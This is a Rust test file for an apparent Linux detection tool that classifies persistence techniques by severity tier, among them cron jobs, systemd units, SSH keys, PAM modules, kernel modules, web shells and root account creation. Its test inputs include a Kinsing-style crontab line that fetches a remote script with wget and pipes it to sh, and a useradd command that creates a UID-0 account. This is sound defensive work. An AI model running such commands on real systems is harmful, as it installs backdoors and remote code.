// SPDX-License-Identifier: GPL-3.0-only
use super::support::*;

/// A program that writes `path`.
fn writes(path: &str) -> Calls {
    vec![open_write(1, path, 3), write(1, 3, b"x"), close(1, 3)]
}

fn rule_for(path: &str) -> Vec<String> {
    let out = run(writes(path));
    rules_of(&out)
        .into_iter()
        .filter(|rule| {
            rule.starts_with("persistence.")
                || rule.starts_with("injection.")
                || rule.starts_with("privilege.")
        })
        .collect()
}

#[test]
fn every_persistence_path_has_its_rule_and_tier() {
    for (path, rule, expected) in [
        ("/etc/cron.d/job", "persistence.cron", "high"),
        ("/etc/crontab", "persistence.cron", "high"),
        ("/var/spool/cron/crontabs/root", "persistence.cron", "high"),
        ("/etc/cron.hourly/gcc.sh", "persistence.cron", "high"),
        (
            "/var/spool/cron/atjobs/a0001",
            "persistence.at_job",
            "medium",
        ),
        (
            "/etc/systemd/system/x.service",
            "persistence.systemd",
            "high",
        ),
        (
            "/usr/lib/systemd/system/x.timer",
            "persistence.systemd",
            "high",
        ),
        (
            "/home/u/.config/systemd/user/x.service",
            "persistence.systemd",
            "high",
        ),
        ("/etc/rc.local", "persistence.rc_init", "high"),
        ("/etc/init.d/S90x", "persistence.rc_init", "high"),
        ("/etc/rc3.d/S99x", "persistence.rc_init", "high"),
        (
            "/etc/update-motd.d/99-x",
            "persistence.event_script",
            "medium",
        ),
        (
            "/etc/NetworkManager/dispatcher.d/x",
            "persistence.event_script",
            "medium",
        ),
        ("/root/.bashrc", "persistence.shell_profile", "medium"),
        ("/home/u/.zshrc", "persistence.shell_profile", "medium"),
        ("/etc/profile.d/x.sh", "persistence.shell_profile", "medium"),
        (
            "/root/.ssh/authorized_keys",
            "persistence.ssh_authorized_keys",
            "high",
        ),
        (
            "/etc/ssh/sshd_config",
            "persistence.ssh_authorized_keys",
            "high",
        ),
        (
            "/home/u/.config/autostart/x.desktop",
            "persistence.xdg_autostart",
            "medium",
        ),
        (
            "/etc/xdg/autostart/x.desktop",
            "persistence.xdg_autostart",
            "medium",
        ),
        ("/etc/udev/rules.d/99-x.rules", "persistence.udev", "high"),
        ("/etc/pam.d/sshd", "persistence.pam", "high"),
        (
            "/usr/lib/x86_64-linux-gnu/security/pam_x.so",
            "persistence.pam",
            "high",
        ),
        (
            "/etc/modules-load.d/x.conf",
            "persistence.module_autoload",
            "high",
        ),
        (
            "/etc/modprobe.d/x.conf",
            "persistence.module_autoload",
            "high",
        ),
        (
            "/lib/modules/6.12.0/extra/x.ko",
            "persistence.module_autoload",
            "high",
        ),
        ("/etc/apt/apt.conf.d/99x", "persistence.apt_hook", "medium"),
        ("/var/www/html/shell.php", "persistence.web_shell", "medium"),
        ("/srv/www/cgi/x.cgi", "persistence.web_shell", "medium"),
        ("/etc/passwd", "persistence.account", "high"),
        ("/etc/shadow", "persistence.account", "high"),
        ("/etc/sudoers.d/x", "privilege.sudoers", "high"),
        ("/etc/sudoers", "privilege.sudoers", "high"),
    ] {
        let out = run(writes(path));
        assert_eq!(
            tier(&out, rule).as_deref(),
            Some(expected),
            "{path} should be {rule}"
        );
        assert!(
            !has(&out, "persistence.config_write"),
            "{path}: the specific rule takes the path"
        );
    }
}

#[test]
fn rules_use_the_destination_of_a_rename_or_link_and_ignore_reads() {
    let out = run(vec![rename(1, "/tmp/job", "/etc/cron.d/job")]);
    assert_eq!(tier(&out, "persistence.cron").as_deref(), Some("high"));
    let moved_away = run(vec![rename(1, "/etc/cron.d/job", "/tmp/job")]);
    assert!(!has(&moved_away, "persistence.cron"));
    assert!(!has(
        &run(vec![open_read(1, "/etc/crontab", 3)]),
        "persistence.cron"
    ));
}

#[test]
fn ordinary_configuration_is_low_and_the_specific_rules_do_not_double_count() {
    let out = run(writes("/etc/resolv.conf"));
    assert_eq!(
        tier(&out, "persistence.config_write").as_deref(),
        Some("low")
    );
    assert_eq!(rule_for("/etc/resolv.conf"), ["persistence.config_write"]);
    assert_eq!(rule_for("/etc/cron.d/x"), ["persistence.cron"]);
    assert!(rule_for("/tmp/data").is_empty());
    assert!(!has(
        &run(writes("/home/u/notes.txt")),
        "persistence.config_write"
    ));
}

#[test]
fn a_package_manager_writing_a_persistence_path_is_one_tier_down() {
    let mut calls = vec![exec(1, "/usr/bin/dpkg", &["dpkg", "-i", "x.deb"])];
    calls.extend(writes("/etc/cron.d/pkg"));
    let out = run(calls);
    let row = rows(&out, "persistence.cron");
    assert_eq!(row.len(), 1);
    assert_eq!(text(row[0], "finding.tier"), "medium");
    assert_eq!(text(row[0], "finding.base_tier"), "high");
    assert!(list(row[0], "finding.flags").contains(&"allow-listed".to_owned()));
    assert!(list(row[0], "finding.why")
        .iter()
        .any(|line| line.contains("allow-list")));
}

#[test]
fn a_system_program_written_over_is_high_unless_it_is_cache() {
    for path in [
        "/usr/bin/ssh",
        "/lib/x86_64-linux-gnu/libkeyutils.so.1",
        "/usr/sbin/sshd",
        "/bin/ps",
    ] {
        assert_eq!(
            tier(&run(writes(path)), "persistence.binary_replace").as_deref(),
            Some("high"),
            "{path}"
        );
    }
    assert!(!has(
        &run(writes("/usr/lib/python3/__pycache__/x.pyc")),
        "persistence.binary_replace"
    ));
    assert!(!has(&run(writes("/tmp/ssh")), "persistence.binary_replace"));
    let renamed = run(vec![rename(1, "/tmp/sshd", "/usr/sbin/sshd")]);
    assert!(has(&renamed, "persistence.binary_replace"));
}

#[test]
fn loading_a_kernel_module_is_high_and_a_refused_load_medium() {
    let image = sys(1, 175, "init_module", [0, 100, 0, 0, 0, 0], 0);
    assert_eq!(
        tier(&run(vec![image]), "persistence.module").as_deref(),
        Some("high")
    );
    let by_fd = vec![
        open_read(1, "/tmp/rk.ko", 4),
        sys(1, 313, "finit_module", [4, 0, 0, 0, 0, 0], 0),
    ];
    let out = run(by_fd);
    assert!(rows(&out, "persistence.module")[0].cells[4]
        .text
        .contains("/tmp/rk.ko"));
    let refused = run(vec![sys(1, 313, "finit_module", [4, 0, 0, 0, 0, 0], -1)]);
    assert_eq!(
        tier(&refused, "persistence.module").as_deref(),
        Some("medium")
    );
    assert_eq!(
        list(rows(&refused, "persistence.module")[0], "finding.technique"),
        ["T1547.006", "DET0450"]
    );
}

#[test]
fn crontab_with_a_file_or_a_pipe_and_at_jobs_are_exec_persistence() {
    for argv in [vec!["crontab", "/tmp/c"], vec!["crontab", "-"]] {
        assert_eq!(
            tier(
                &run(vec![exec(1, "/usr/bin/crontab", &argv)]),
                "persistence.cron"
            )
            .as_deref(),
            Some("high"),
            "{argv:?}"
        );
    }
    assert!(!has(
        &run(vec![exec(1, "/usr/bin/crontab", &["crontab", "-l"])]),
        "persistence.cron"
    ));
    let kinsing = run(vec![shell(1, "(crontab -l 2>/dev/null; echo '* * * * * wget -q -O - http://203.0.113.9/d.sh | sh') | crontab -")]);
    assert!(has(&kinsing, "persistence.cron"));
    assert_eq!(
        tier(
            &run(vec![exec(1, "/usr/bin/at", &["at", "now"])]),
            "persistence.at_job"
        )
        .as_deref(),
        Some("medium")
    );
    assert!(has(
        &run(vec![exec(1, "/usr/bin/batch", &["batch"])]),
        "persistence.at_job"
    ));
}

#[test]
fn enabling_a_unit_or_script_the_run_wrote_is_persistence() {
    let unit = run(vec![
        open_write(1, "/etc/systemd/system/evil.service", 3),
        exec(
            2,
            "/usr/bin/systemctl",
            &["systemctl", "enable", "evil.service"],
        ),
    ]);
    assert!(rows(&unit, "persistence.systemd")
        .iter()
        .any(|row| text(row, "finding.object").contains("systemctl")));
    let other = run(vec![exec(
        2,
        "/usr/bin/systemctl",
        &["systemctl", "enable", "nginx.service"],
    )]);
    assert!(!has(&other, "persistence.systemd"));
    let script = run(vec![
        open_write(1, "/etc/init.d/evil", 3),
        exec(
            2,
            "/usr/sbin/update-rc.d",
            &["update-rc.d", "evil", "defaults"],
        ),
    ]);
    assert!(rows(&script, "persistence.rc_init")
        .iter()
        .any(|row| text(row, "finding.object").contains("update-rc.d")));
}

#[test]
fn account_tools_with_an_operand_are_persistence() {
    for argv in [
        vec!["useradd", "-o", "-u", "0", "evil"],
        vec!["usermod", "-aG", "sudo", "evil"],
        vec!["adduser", "evil"],
    ] {
        let path = format!("/usr/sbin/{}", argv[0]);
        assert_eq!(
            tier(&run(vec![exec(1, &path, &argv)]), "persistence.account").as_deref(),
            Some("high"),
            "{argv:?}"
        );
    }
    assert!(!has(
        &run(vec![exec(1, "/usr/bin/passwd", &["passwd"])]),
        "persistence.account"
    ));
    assert!(has(
        &run(vec![shell(1, "echo evil:x | chpasswd")]),
        "persistence.account"
    ));
}

#[test]
fn the_account_tool_itself_writing_passwd_is_one_tier_down() {
    let mut calls = vec![exec(1, "/usr/sbin/useradd", &["useradd", "x"])];
    calls.extend(writes("/etc/passwd"));
    let out = run(calls);
    // The exec by the sample is the high row; useradd's own write is lowered.
    let found = rows(&out, "persistence.account");
    assert_eq!(found.len(), 2);
    assert!(found.iter().any(|row| text(row, "finding.tier") == "high"));
    assert!(found
        .iter()
        .any(|row| text(row, "finding.tier") == "medium"));
}
